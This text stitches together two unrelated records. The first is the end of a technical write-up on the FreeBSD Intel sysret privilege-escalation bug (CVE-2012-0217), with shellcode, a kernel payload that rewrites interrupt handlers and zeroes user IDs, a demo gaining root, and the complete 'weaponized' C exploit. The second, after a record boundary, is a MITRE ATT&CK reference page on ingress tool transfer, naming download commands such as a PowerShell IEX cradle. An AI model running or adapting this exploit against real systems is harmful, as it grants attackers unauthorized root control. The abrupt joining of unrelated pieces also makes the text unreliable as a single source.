in\nthis trapframe if you don\u2019t understand why).\n* [2] writes 0 to tf_addr which is also 16-byte aligned. So no dice.\n* That leaves us with [1] which writes T_PROTFLT (0x9) to tf_trapno\nand tf_trapno is 16-byte aligned + 8! This enables us to set Target\nOffset[63:32] to 0x9.\nThus, if we set rsp to &idt[14] + 10*8 (to align tf_trapno with the\n#PF\u2019s Target Offset[63:32]), we can set the #PF handler\u2019s address to\n0x9WWXXYYZZ.\nFurthermore, WWXXYYZZ is known since we can get the #PF\u2019s address\nthrough get_symaddr(). To get an arbitrary code execution, the idea is\ntherefore to setup a trampoline code at 0x9WWXXYYZZ, which contains\nsome setup code and a jump to our kernel mode payload (pointed by rax\nin the following code).\n*(uint64_t*)(trigger_addr + 10) = (uint64_t)(((uint8_t*)&sidt()[14]) + 10 * 8);\nchar trampolinecode[] =\n\"\\x0f\\x01\\xf8\" \/\/ swapgs; switch back to the kernel's GS.base\n\"\\x48\\x89\\xdc\" \/\/ mov rsp, rbx; restore rsp, it's enough to use the user's s\ntack\n\"\\x48\\xb8\\xbe\\xba\\xfe\\xca\\xde\\xc0\\xad\\xde\" \/\/ mov rax, 0xdeadc0decafebabe\n\"\\xff\\xe0\"; \/\/ jmp rax\nuint8_t * trampoline = (uint8_t*)(0x900000000 | (Xpage_ptr & 0xFFFFFFFF));\nsize_t trampoline_allocsize = pagesize;\n\/\/ We round the address to the PAGESIZE for the allocation\n\/\/ Not enough space for the trampoline code ?\nif ((uint8_t*)((uint64_t)trampoline & ~(pagesize-1)) + pagesize < trampoline + T\nRAMPOLINECODESIZE)\ntrampoline_allocsize += pagesize;\nif (mmap((void*)((uint64_t)trampoline & ~(pagesize-1)), trampoline_allocsize,\nPROT_READ | PROT_WRITE | PROT_EXEC,\nMAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0) == MAP_FAILED)\n{\nperror(\"mmap (trampoline)\");\nexit(1);\n}\nmemcpy(trampoline, trampolinecode, TRAMPOLINECODESIZE);\n*(uint64_t*)(trampoline + 8) = (uint64_t)kernelmodepayload;\nKeeping the kernel stable\nGetting a root shell and crashing after 1us is not fun, isn\u2019t it? We\u2019d\nbetter restore whatever we overwrote in the kernel space while trying\nto achieve code execution\u2026\nLet\u2019s summarize what we smashed with rsp initialized to idt[14] + 10*8,\ni.e. idt[19]:\n* The #GP exception frame writes 6*64bit registers, i.e. it\noverwrites idt[18], idt[17] and idt[16]\n* tf_addr overwrites the 64-LSB of idt[15]\n* tf_trapno overwrites the Target Offset[63:32] field of idt[14]\n* rdi overwrites the 64-LSB of idt[7]\n* The #PF exception frame overwrites idt[6], idt[5] and idt[4]\nThus overall, the IDT\u2019s entries 4, 5, 6, 7, 14, 15, 16, 17, and 18 need\nto be restored and we should be safe.\nstruct gate_descriptor *idt = sidt();\nsetidt(idt, IDT_OF, Xofl_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 4\nsetidt(idt, IDT_BR, Xbnd_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 5\nsetidt(idt, IDT_UD, Xill_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 6\nsetidt(idt, IDT_NM, Xdna_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 7\nsetidt(idt, IDT_PF, Xpage_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 14\nsetidt(idt, IDT_MF, Xfpu_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 15\nsetidt(idt, IDT_AC, Xalign_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 16\nsetidt(idt, IDT_MC, Xmchk_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 17\nsetidt(idt, IDT_XF, Xxmm_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 18\nPrivilege escalation\nThis part is quite standard and easy, we just need to retrieve the\ncurrent user credentials struct\u2019s address, and set the various IDs to 0\n(root).\nKnowing that the current thread struct\u2019s address can be read from gs:0\nuder FreeBSD, this yields to the following code.\nstruct thread *td;\nstruct ucred *cred;\n\/\/ get the thread pointer\nasm (\"mov %%gs:0, %0\" : \"=r\"(td));\n\/\/ The Dark Knight Rises\ncred = td->td_proc->p_ucred;\ncred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;\ncred->cr_groups[0] = 0;\nShellcode\nFinally\u2026 We return to our userland shellcode using the sysret\ninstruction.\n\/\/ return to user mode to spawn the shell\nasm (\"swapgs; sysretq;\" :: \"c\"(shellcode)); \/\/ store the shellcode addr to rcx\nAnd the shellcode? What shellcode? :P\nThe user credentials struct is cached\/shared among the user\u2019s\nprocesses. Since we modified it, the caller\u2019s shell will automagically\ninherit from this privilege escalation.\nHence the following shellcode ;-)\nvoid shellcode()\n{\n\/\/ Actually we dont really need to spawn a shell since we\n\/\/ changed our whole cred struct.\n\/\/ Just exit...\nprintf(\"[*] Got root!\\n\");\nexit(0);\n}\nDemo\n$ uname -a\nFreeBSD FreeBSD 9.0 64bit 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:3\n0 UTC 2012     root@farrell.cse.buffalo.    edu:\/usr\/obj\/usr\/src\/sys\/GENERIC  am\nd64\n$ id\nuid=1001(qwerty) gid=1001(qwerty) groups=1001(qwerty)\n$ ls -l\ntotal 24\n-rwxr-xr-x  1 qwerty  qwerty  11693 Jul  5 17:49 CVE-2012-0217\n-rw-r--r--  1 qwerty  qwerty  10763 Jul  5 17:49 CVE-2012-0217.c\n$ .\/CVE-2012-0217\nCVE-2012-0217 Intel sysret exploit -- iZsh (izsh at fail0verflow.com)\n[*] Retrieving host information...\n[+] CPU: GenuineIntel\n[+] sysname: FreeBSD\n[+] release: 9.0-RELEASE\n[+] version: FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@f\narrell.cse.buffalo. edu:\/usr\/obj\/usr\/src\/sys\/GENERIC\n[+] machine: amd64\n[*] Validating target OS and version...\n[+] Vulnerable :-)\n[*] Resolving kernel addresses...\n[+] Resolved Xofl to 0xffffffff80b02e70\n[+] Resolved Xbnd to 0xffffffff80b02ea0\n[+] Resolved Xill to 0xffffffff80b02ed0\n[+] Resolved Xdna to 0xffffffff80b02f00\n[+] Resolved Xpage to 0xffffffff80b03240\n[+] Resolved Xfpu to 0xffffffff80b02fc0\n[+] Resolved Xalign to 0xffffffff80b03080\n[+] Resolved Xmchk to 0xffffffff80b02f60\n[+] Resolved Xxmm to 0xffffffff80b02ff0\n[*] Setup...\n[+] Trigger code...\n[+] Trampoline code...\n[*] Fire in the hole!\n[*] Got root!\n$ id\nuid=0(root) gid=0(wheel) groups=0(wheel)\nFinal words\nThe final exploit is quite stable, nicely recovers and exit back to the\nuser\u2019s shell. It works on both FreeBSD 8 and 9 (and probably 7) as-is\nwith the stock kernels without any need for special magic hardcoded\nvalues; but of course the environment could be hardened.\nTo conclude: the mandatory video :-)\nIFRAME: [48]\/\/www.youtube.com\/embed\/2w1Tbyi-v8Q\nAnd\u2026 That\u2019s a wrap!\nHope you enjoyed it. Feel free to comment or discuss other exploitation\npaths.\n[1] Xfast_syscall is defined in sys\/amd64\/amd64\/exception.S\n[2] Xprot is defined in sys\/amd64\/amd64\/exception.S\n[3] Xdblfault is defined in sys\/amd64\/amd64\/exception.S\n[4] Xpage is defined in sys\/amd64\/amd64\/exception.S\nThe full weaponized exploit\nalso available on [49]github\n\/\/ CVE-2012-0217 Intel sysret exploit -- iZsh (izsh at fail0verflow.com)\n\/\/ Copyright 2012 all right reserved, not for commercial uses, bitches\n\/\/ Infringement Punishment: Monkeys coming out of your ass Bruce Almighty style.\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys\/mman.h>\n#include <sys\/utsname.h>\n#include <machine\/cpufunc.h>\n#define _WANT_UCRED\n#include <sys\/proc.h>\n#include <machine\/segments.h>\n#include <sys\/param.h>\n#include <sys\/linker.h>\nuintptr_t Xofl_ptr, Xbnd_ptr, Xill_ptr, Xdna_ptr, Xpage_ptr, Xfpu_ptr, Xalign_pt\nr, Xmchk_ptr, Xxmm_ptr;\nstruct gate_descriptor * sidt()\n{\nstruct region_descriptor idt;\nasm (\"sidt %0\": \"=m\"(idt));\nreturn (struct gate_descriptor*)idt.rd_base;\n}\nu_long get_symaddr(char *symname)\n{\nstruct kld_sym_lookup ksym;\nksym.version = sizeof (ksym);\nksym.symname = symname;\nif (kldsym(0, KLDSYM_LOOKUP, &ksym) < 0) {\nperror(\"kldsym\");\nexit(1);\n}\nprintf(\"    [+] Resolved %s to %#lx\\n\", ksym.symname, ksym.symvalue);\nreturn ksym.symvalue;\n}\n\/\/ Code taken from amd64\/amd64\/machdep.c\nvoid setidt(struct gate_descriptor *idt, int idx, uintptr_t func, int typ, int d\npl, int ist)\n{\nstruct gate_descriptor *ip;\nip = idt + idx;\nip->gd_looffset = func;\nip->gd_selector = GSEL(GCODE_SEL, SEL_KPL);\nip->gd_ist = ist;\nip->gd_xx = 0;\nip->gd_type = typ;\nip->gd_dpl = dpl;\nip->gd_p = 1;\nip->gd_hioffset = func>>16;\n}\nvoid shellcode()\n{\n\/\/ Actually we dont really need to spawn a shell since we\n\/\/ changed our whole cred struct.\n\/\/ Just exit...\nprintf(\"[*] Got root!\\n\");\nexit(0);\n}\nvoid kernelmodepayload()\n{\nstruct thread *td;\nstruct ucred *cred;\n\/\/ We need to restore\/recover whatever we smashed\n\/\/ We inititalized rsp to idt[14] + 10*8, i.e. idt[19] (see trigger())\n\/\/ The #GP exception frame writes 6*64bit registers, i.e. it overwrites\n\/\/ idt[18], idt[17] and idt[16]\n\/\/ thus overall we have:\n\/\/ - idt[18], idt[17] and idt[16] are trashed\n\/\/ - tf_addr -> overwrites the 64bit-LSB of idt[15]\n\/\/ - tf_trapno -> overwrites Target Offset[63:32] of idt[14]\n\/\/ - rdi -> overwrites the 64bit-LSB of idt[7]\n\/\/ - #PF exception frame overwrites idt[6], idt[5] and idt[4]\nstruct gate_descriptor *idt = sidt();\nsetidt(idt, IDT_OF, Xofl_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 4\nsetidt(idt, IDT_BR, Xbnd_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 5\nsetidt(idt, IDT_UD, Xill_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 6\nsetidt(idt, IDT_NM, Xdna_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 7\nsetidt(idt, IDT_PF, Xpage_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 14\nsetidt(idt, IDT_MF, Xfpu_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 15\nsetidt(idt, IDT_AC, Xalign_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 16\nsetidt(idt, IDT_MC, Xmchk_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 17\nsetidt(idt, IDT_XF, Xxmm_ptr, SDT_SYSIGT, SEL_KPL, 0); \/\/ 18\n\/\/ get the thread pointer\nasm (\"mov %%gs:0, %0\" : \"=r\"(td));\n\/\/ The Dark Knight Rises\ncred = td->td_proc->p_ucred;\ncred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;\ncred->cr_groups[0] = 0;\n\/\/ return to user mode to spawn the shell\nasm (\"swapgs; sysretq;\" :: \"c\"(shellcode)); \/\/ store the shellcode addr to r\ncx\n}\n#define TRIGGERCODESIZE 20\n#define TRAMPOLINECODESIZE 18\nvoid trigger()\n{\nprintf(\"[*] Setup...\\n\");\n\/\/ Allocate one page just before the non-canonical address\nprintf(\"    [+] Trigger code...\\n\");\nuint64_t pagesize = getpagesize();\nuint8_t * area = (uint8_t*)((1ULL << 47) - pagesize);\narea = mmap(area, pagesize,\nPROT_READ | PROT_WRITE | PROT_EXEC,\nMAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);\nif (area == MAP_FAILED) {\nperror(\"mmap (trigger)\");\nexit(1);\n}\n\/\/ Copy the trigger code at the end of the page\n\/\/ such that the syscall instruction is at its\n\/\/ boundary\nchar triggercode[] =\n\"\\xb8\\x18\\x00\\x00\\x00\" \/\/ mov rax, 24; #getuid\n\"\\x48\\x89\\xe3\" \/\/ mov rbx, rsp; save the user's stack for later\n\"\\x48\\xbc\\xbe\\xba\\xfe\\xca\\xde\\xc0\\xad\\xde\" \/\/ mov rsp, 0xdeadc0decafebab\ne\n\"\\x0f\\x05\"; \/\/ syscall\nuint8_t * trigger_addr = area + pagesize - TRIGGERCODESIZE;\nmemcpy(trigger_addr, triggercode, TRIGGERCODESIZE);\n\/\/ There are two outcomes given a target rsp:\n\/\/ - if rsp can't be written to, a double fault is triggered\n\/\/   (Xdblfault defined in sys\/amd64\/amd64\/exception.S)\n\/\/   and the exception frame is pushed to a special stack\n\/\/ - otherwise a #GP is triggered\n\/\/   (Xprot defined in sys\/amd64\/amd64\/exception.S)\n\/\/   and the exception frame is pushed to [rsp]\n\/\/\n\/\/ In the latter case, trouble is... #GP triggers a page fault\n\/\/ (Xpage):\n\/\/  IDTVEC(prot)\n\/\/      subq    $TF_ERR,%rsp\n\/\/  [1] movl    $T_PROTFLT,TF_TRAPNO(%rsp)\n\/\/  [2] movq    $0,TF_ADDR(%rsp)\n\/\/  [3] movq    %rdi,TF_RDI(%rsp)   \/* free up a GP register *\/\n\/\/      leaq    doreti_iret(%rip),%rdi\n\/\/      cmpq    %rdi,TF_RIP(%rsp)\n\/\/      je  1f          \/* kernel but with user gsbase!! *\/\n\/\/  [4] testb   $SEL_RPL_MASK,TF_CS(%rsp) \/* Did we come from kernel? *\/\n\/\/      jz  2f          \/* already running with kernel GS.base *\/\n\/\/  1:  swapgs\n\/\/  2:  movq    PCPU(CURPCB),%rdi [5]\n\/\/\n\/\/ [4] sets the Z flag because we come from the kernel (while executing sysr\net)\n\/\/ and we therefore skip swapgs. But GS is in fact the user GS.base! Indeed\n\/\/ it was restored just before calling sysret...\n\/\/ Thus, [5] triggers a pagefault while trying to access gs:data\n\/\/ If we don't do anything we'll eventually doublefault, tripplefault etc. a\nnd crash\n\/\/\n\/\/ We therefore need a way: (1) to recover from the GP, (2) to clean\n\/\/ any mess we did. Both could be solved if we can get get an arbitrary\n\/\/ code execution by the time we reach [5] (NB: this is not mandatory, we co\nuld\n\/\/ get the code execution later down the fault trigger chain)\n\/\/\n\/\/ So... here is the idea: wouldn't it be nice if we could overwrite the\n\/\/ page fault handler's address and therefore get code execution when [5]\n\/\/ triggers the #PF?\n\/\/\n\/\/ For reference:\n\/\/ Gate descriptor:\n\/\/ +0: Target Offset[15:0] | Target Selector\n\/\/ +4: Some stuff | Target Offset[31:16]\n\/\/ +8: Target Offset[63:32]\n\/\/ +12: Stuff\n\/\/\n\/\/ and from include\/frame.h:\n\/\/  struct trapframe {\n\/\/      register_t  tf_rdi;\n\/\/      register_t  tf_rsi;\n\/\/      register_t  tf_rdx;\n\/\/      register_t  tf_rcx;\n\/\/      register_t  tf_r8;\n\/\/      register_t  tf_r9;\n\/\/      register_t  tf_rax;\n\/\/      register_t  tf_rbx;\n\/\/      register_t  tf_rbp;\n\/\/      register_t  tf_r10;\n\/\/      register_t  tf_r11;\n\/\/      register_t  tf_r12;\n\/\/      register_t  tf_r13;\n\/\/      register_t  tf_r14;\n\/\/      register_t  tf_r15;\n\/\/      uint32_t    tf_trapno;\n\/\/      uint16_t    tf_fs;\n\/\/      uint16_t    tf_gs;\n\/\/      register_t  tf_addr;\n\/\/      uint32_t    tf_flags;\n\/\/      uint16_t    tf_es;\n\/\/      uint16_t    tf_ds;\n\/\/      \/* below portion defined in hardware *\/\n\/\/      register_t  tf_err;\n\/\/      register_t  tf_rip;\n\/\/      register_t  tf_cs;\n\/\/      register_t  tf_rflags;\n\/\/      register_t  tf_rsp;\n\/\/      register_t  tf_ss;\n\/\/  };\n\/\/\n\/\/ When the exception is triggered, the hardware pushes\n\/\/ ss, rsp, rflags, cs, rip and err\n\/\/\n\/\/ We can see that [1], [2] and [3] write to the stack\n\/\/ [3] is fully user-controlled through rdi, so we could try to align\n\/\/ rsp such that [3] overwrites the offset address\n\/\/\n\/\/ The trouble is... rsp is 16byte aligned for exceptions. We can\n\/\/ therefore only overwrite the first 32-LSB of the offset address\n\/\/ (check how rdi is 16byte aligned in this trapframe)\n\/\/\n\/\/ [2] writes 0 to tf_addr which is also 16byte aligned. So no dice.\n\/\/ That leaves us with [1] which writes T_PROTFLT (0x9) to tf_trapno\n\/\/ and tf_trapno is 16byte aligned + 8!\n\/\/ This enables us to set Target Offset[63:32] to 0x9\n\/\/\n\/\/ We set rsp to &idt[14] + 10 * 8 (to align tf_trapno with Offset[63:32])\n*(uint64_t*)(trigger_addr + 10) = (uint64_t)(((uint8_t*)&sidt()[14]) + 10 *\n8);\n\/\/ Hence, the #PF handler's address is now 0x9WWXXYYZZ\n\/\/ Furthermore, WWXXYYZZ is known since we can get (see get_symaddr()) the #\nPF's address\n\/\/ Thus, the idea is to setup a trampoline code at 0x9WWXXYYZZ which does\n\/\/ some setup and jump to our kernel mode code\nprintf(\"    [+] Trampoline code...\\n\");\nchar trampolinecode[] =\n\"\\x0f\\x01\\xf8\" \/\/ swapgs; switch back to the kernel's GS.base\n\"\\x48\\x89\\xdc\" \/\/ mov rsp, rbx; restore rsp, it's enough to use the user\n's stack\n\"\\x48\\xb8\\xbe\\xba\\xfe\\xca\\xde\\xc0\\xad\\xde\" \/\/ mov rax, 0xdeadc0decafebab\ne\n\"\\xff\\xe0\"; \/\/ jmp rax\nuint8_t * trampoline = (uint8_t*)(0x900000000 | (Xpage_ptr & 0xFFFFFFFF));\nsize_t trampoline_allocsize = pagesize;\n\/\/ We round the address to the PAGESIZE for the allocation\n\/\/ Not enough space for the trampoline code ?\nif ((uint8_t*)((uint64_t)trampoline & ~(pagesize-1)) + pagesize < trampoline\n+ TRAMPOLINECODESIZE)\ntrampoline_allocsize += pagesize;\nif (mmap((void*)((uint64_t)trampoline & ~(pagesize-1)), trampoline_allocsize\n,\nPROT_READ | PROT_WRITE | PROT_EXEC,\nMAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0) == MAP_FAILED)\n{\nperror(\"mmap (trampoline)\");\nexit(1);\n}\nmemcpy(trampoline, trampolinecode, TRAMPOLINECODESIZE);\n*(uint64_t*)(trampoline + 8) = (uint64_t)kernelmodepayload;\n\/\/ Call it\nprintf(\"[*] Fire in the hole!\\n\");\n((void (*)())trigger_addr)();\n}\ntypedef struct validtarget\n{\nchar * sysname;\nchar * release;\nchar * machine;\n} validtarget_t;\nint validate_target(char * sysname, char * release, char * machine)\n{\nvalidtarget_t targets[] = {\n{ \"FreeBSD\", \"8.3-RELEASE\", \"amd64\" },\n{ \"FreeBSD\", \"9.0-RELEASE\", \"amd64\" },\n{ 0, 0, 0 }\n};\nint found = 0;\nint i = 0;\nwhile (!found && targets[i].sysname) {\nfound = !strcmp(targets[i].sysname, sysname)\n&& !strcmp(targets[i].release, release)\n&& !strcmp(targets[i].machine, machine);\n++i;\n}\nreturn found;\n}\nvoid get_cpu_vendor(char * cpu_vendor)\n{\nu_int regs[4];\ndo_cpuid(0, regs);\n((u_int *)cpu_vendor)[0] = regs[1];\n((u_int *)cpu_vendor)[1] = regs[3];\n((u_int *)cpu_vendor)[2] = regs[2];\ncpu_vendor[12] = '\\0';\n}\nint is_intel()\n{\nchar cpu_vendor[13];\nget_cpu_vendor(cpu_vendor);\nreturn !strcmp(cpu_vendor, \"GenuineIntel\");\n}\nint main(int argc, char *argv[])\n{\nprintf(\"CVE-2012-0217 Intel sysret exploit -- iZsh (izsh at fail0verflow.com\n)\\n\\n\");\nprintf(\"[*] Retrieving host information...\\n\");\nchar cpu_vendor[13];\nget_cpu_vendor(cpu_vendor);\nstruct utsname ver;\nuname(&ver);\nprintf(\"    [+] CPU: %s\\n\", cpu_vendor);\nprintf(\"    [+] sysname: %s\\n\", ver.sysname);\nprintf(\"    [+] release: %s\\n\", ver.release);\nprintf(\"    [+] version: %s\\n\", ver.version);\nprintf(\"    [+] machine: %s\\n\", ver.machine);\nprintf(\"[*] Validating target OS and version...\\n\");\nif (!is_intel() || !validate_target(ver.sysname, ver.release, ver.machine))\n{\nprintf(\"    [+] NOT Vulnerable :-(\\n\");\nexit(1);\n} else\nprintf(\"    [+] Vulnerable :-)\\n\");\n\/\/ Prepare the values we'll need to restore the kernel to a stable state\nprintf(\"[*] Resolving kernel addresses...\\n\");\nXofl_ptr = (uintptr_t)get_symaddr(\"Xofl\");\nXbnd_ptr = (uintptr_t)get_symaddr(\"Xbnd\");\nXill_ptr = (uintptr_t)get_symaddr(\"Xill\");\nXdna_ptr = (uintptr_t)get_symaddr(\"Xdna\");\nXpage_ptr = (uintptr_t)get_symaddr(\"Xpage\");\nXfpu_ptr = (uintptr_t)get_symaddr(\"Xfpu\");\nXalign_ptr = (uintptr_t)get_symaddr(\"Xalign\");\nXmchk_ptr = (uintptr_t)get_symaddr(\"Xmchk\");\nXxmm_ptr = (uintptr_t)get_symaddr(\"Xxmm\");\n\/\/ doeet!\ntrigger();\nreturn 0;\n}\nPlease enable JavaScript to view the comments.\n\u00a9 fail0verflow, all rights reserved. Not a member of the Cheezburger\u00a9\nGroup."}
{"text":"[1][mitre_attack_logo.png] (BUTTON)\n* [2]Matrices\n[3]Enterprise [4]Mobile [5]ICS\n* [6]Tactics\n[7]Enterprise [8]Mobile [9]ICS\n* [10]Techniques\n[11]Enterprise [12]Mobile [13]ICS\n* [14]Defenses\n[15]Data Sources\n[16]Mitigations\n[17]Enterprise [18]Mobile [19]ICS\n[20]Assets\n* [21]CTI\n[22]Groups [23]Software [24]Campaigns\n* [25]Resources\n[26]General Information [27]Getting Started [28]Contribute\n[29]Training [30]ATT&CKcon [31]Working with ATT&CK [32]FAQ\n[33]Updates [34]Versions of ATT&CK [35]Related Projects [36]Brand\nGuide\n* [37]Benefactors\n* [38]Blog  External site\n* (BUTTON) Search\nATT&CK v14 has been released! Check out the [39]blog post or\n[40]release notes for more information.\n1. [41]Home\n2. [42]Techniques\n3. [43]Enterprise\n4. Ingress Tool Transfer\nIngress Tool Transfer\nAdversaries may transfer tools or other files from an external system\ninto a compromised environment. Tools or files may be copied from an\nexternal adversary-controlled system to the victim network through the\ncommand and control channel or through alternate protocols such as\n[44]ftp. Once present, adversaries may also transfer\/spread tools\nbetween victim devices within a compromised environment (i.e.\n[45]Lateral Tool Transfer).\nOn Windows, adversaries may use various utilities to download tools,\nsuch as copy, finger, [46]certutil, and [47]PowerShell commands such as\nIEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest.\nOn Linux and macOS systems, a variety of utilities also exist, such as\ncurl, scp, sftp, tftp, rsync, finger, and wget.^[48][1]\nAdversaries may also abuse installers and package managers, such as yum\nor winget, to download tools to victim hosts.\nFiles can also be transferred using various [49]Web Services as well as\nnative or otherwise present tools on the victim system.^[50][2] In some\ncases, adversaries may be able to leverage services that sync between a\nweb-based and an on-premises client, such as Dropbox or OneDrive, to\ntransfer files onto victim systems. For example, by compromising a\ncloud account and logging into the service's web portal, an adversary\nmay be able to trigger an automatic syncing process that transfers the\nfile onto the victim's machine.^[51][3]\nID: T1105\nSub-techniques:  No sub-techniques\n\u24d8\nTactic: [52]Command and Control\n\u24d8\nPlatforms: Linux, Windows, macOS\nContributors: Alain Homewood; John Page (aka hyp3rlinx), ApparitionSec;\nMark Wee; Shailesh Tiwary (Indian Army); The DFIR Report\nVersion: 2.3\nCreated: 31 May 2017\nLast Modified: 03 October 2023\n[53]Version Permalink\n[54]Live Version\nProcedure Examples\nID Name Description\n[55]C0028 [56]2015 Ukraine Electric Power Attack\nDuring the [57]2015 Ukraine Electric Power Attack, [58]Sandworm Team\npushed additional malicious tools onto an infected system to steal user\ncredentials, move laterally, and destroy data. ^[59][4]\n[60]S0469 [61]ABK\n[62]ABK has the ability to download files from C2.^[63][5]\n[64]S1028 [65]Action RAT\n[66]Action RAT has the ability to download additional payloads onto an\ninfected machine.^[67][6]\n[68]S0331 [69]Agent Tesla\n[70]Agent Tesla can download additional files for execution on the\nvictim\u2019s machine.^[71][7]^[72][8]\n[73]S0092 [74]Agent.btz\n[75]Agent.btz attempts to download an encrypted binary from a specified\ndomain.^[76][9]\n[77]G0130 [78]Ajax Security Team\n[79]Ajax Security Team has used Wrapper\/Gholee, custom-developed\nmalware, which downloaded additional malware to the infected\nsystem.^[80][10]\n[81]S1025 [82]Amadey\n[83]Amadey can download and execute files to further infect a host\nmachine with additional malware.^[84][11]\n[85]S0504 [86]Anchor\n[87]Anchor can download additional payloads.^[88][12]^[89][13]\n[90]G0138 [91]Andariel\n[92]Andariel has downloaded additional tools and malware onto\ncompromised hosts.^[93][14]\n[94]S1074 [95]ANDROMEDA\n[96]ANDROMEDA can download additional payloads from C2.^[97][15]\n[98]G0099 [99]APT-C-36\n[100]APT-C-36 has downloaded binary data from a specified domain after\nthe malicious document is opened.^[101][16]\n[102]G0026 [103]APT18\n[104]APT18 can upload a file to the victim\u2019s machine.^[105][17]\n[106]G0007 [107]APT28\n[108]APT28 has downloaded additional files, including by using a\nfirst-stage downloader to contact the C2 server to obtain the\nsecond-stage implant.^[109][18]^[110][19]^[111][20]^[112][21]^[113][22]\n[114]G0016 [115]APT29\n[116]APT29 has downloaded additional tools and malware onto compromised\nnetworks.^[117][23]^[118][24]^[119][25]^[120][26]\n[121]G0022 [122]APT3\n[123]APT3 has a tool that can copy files to remote machines.^[124][27]\n[125]G0050 [126]APT32\n[127]APT32 has added JavaScript to victim websites to download\nadditional frameworks that profile and compromise website\nvisitors.^[128][28]\n[129]G0064 [130]APT33\n[131]APT33 has downloaded additional files and programs from its C2\nserver.^[132][29]^[133][30]\n[134]G0067 [135]APT37\n[136]APT37 has downloaded second stage malware from compromised\nwebsites.^[137][31]^[138][32]^[139][33]^[140][34]\n[141]G0082 [142]APT38\n[143]APT38 used a backdoor, NESTEGG, that has the capability to\ndownload and upload files to and from a victim\u2019s machine.^[144][35]\n[145]G0087 [146]APT39\n[147]APT39 has downloaded tools to compromised\nhosts.^[148][36]^[149][37]\n[150]G0096 [151]APT41\n[152]APT41 used [153]certutil to download additional\nfiles.^[154][38]^[155][39]^[156][40]\n[157]G0143 [158]Aquatic Panda\n[159]Aquatic Panda has downloaded additional malware onto compromised\nhosts.^[160][41]\n[161]S0456 [162]Aria-body\n[163]Aria-body has the ability to download additional payloads from\nC2.^[164][42]\n[165]S0373 [166]Astaroth\n[167]Astaroth uses [168]certutil and [169]BITSAdmin to download\nadditional malware. ^[170][43]^[171][44]^[172][45]\n[173]S1087 [174]AsyncRAT\n[175]AsyncRAT has the ability to download files over SFTP.^[176][46]\n[177]S0438 [178]Attor\n[179]Attor can download additional plugins, updates and other files.\n^[180][47]\n[181]S0347 [182]AuditCred\n[183]AuditCred can download files and additional malware.^[184][48]\n[185]S0473 [186]Avenger\n[187]Avenger has the ability to download files from C2 to a compromised\nhost.^[188][5]\n[189]S0344 [190]Azorult\n[191]Azorult can download and execute additional files. [192]Azorult\nhas also downloaded a ransomware payload called\nHermes.^[193][49]^[194][50]\n[195]S0414 [196]BabyShark\n[197]BabyShark has downloaded additional files from the\nC2.^[198][51]^[199][52]\n[200]S0475 [201]BackConfig\n[202]BackConfig can download and execute additional payloads on a\ncompromised host.^[203][53]\n[204]S0093 [205]Backdoor.Oldrea\n[206]Backdoor.Oldrea can download additional modules from C2.^[207][54]\n[208]G0135 [209]BackdoorDiplomacy\n[210]BackdoorDiplomacy has downloaded additional files and tools onto a\ncompromised host.^[211][55]\n[212]S0642 [213]BADFLICK\n[214]BADFLICK has download files from its C2 server.^[215][56]\n[216]S1081 [217]BADHATCH\n[218]BADHATCH has the ability to load a second stage malicious DLL file\nonto a compromised machine.^[219][57]\n[220]S0128 [221]BADNEWS\n[222]BADNEWS is capable of downloading additional files through C2\nchannels, including a new version of\nitself.^[223][58]^[224][59]^[225][60]\n[226]S0337 [227]BadPatch\n[228]BadPatch can download and execute or update malware.^[229][61]\n[230]S0234 [231]Bandook\n[232]Bandook can download files to the system.^[233][62]\n[234]S0239 [235]Bankshot\n[236]Bankshot uploads files and secondary payloads to the victim's\nmachine.^[237][63]\n[238]S0534 [239]Bazar\n[240]Bazar can download and deploy additional payloads, including\nransomware and post-exploitation frameworks such as [241]Cobalt\nStrike.^[242][64]^[243][65]^[244][66]^[245][67]\n[246]S0470 [247]BBK\n[248]BBK has the ability to download files from C2 to the infected\nhost.^[249][5]\n[250]S0574 [251]BendyBear\n[252]BendyBear is designed to download an implant from a C2\nserver.^[253][68]\n[254]S0017 [255]BISCUIT\n[256]BISCUIT has a command to download a file from the C2\nserver.^[257][69]\n[258]S0268 [259]Bisonal\n[260]Bisonal has the capability to download files to execute on the\nvictim\u2019s machine.^[261][70]^[262][71]^[263][72]\n[264]S0190 [265]BITSAdmin\n[266]BITSAdmin can be used to create [267]BITS Jobs to upload and\/or\ndownload files.^[268][73]\n[269]G1002 [270]BITTER\n[271]BITTER has downloaded additional malware and tools onto a\ncompromised host.^[272][74]^[273][75]\n[274]S0564 [275]BlackMould\n[276]BlackMould has the ability to download files to the victim's\nmachine.^[277][76]\n[278]S0520 [279]BLINDINGCAN\n[280]BLINDINGCAN has downloaded files to a victim machine.^[281][77]\n[282]S0657 [283]BLUELIGHT\n[284]BLUELIGHT can download additional files onto the host.^[285][33]\n[286]S0486 [287]Bonadan\n[288]Bonadan can download additional modules from the C2\nserver.^[289][78]\n[290]S0360 [291]BONDUPDATER\n[292]BONDUPDATER can download or upload files from its C2\nserver.^[293][79]\n[294]S0635 [295]BoomBox\n[296]BoomBox has the ability to download next stage malware components\nto a compromised 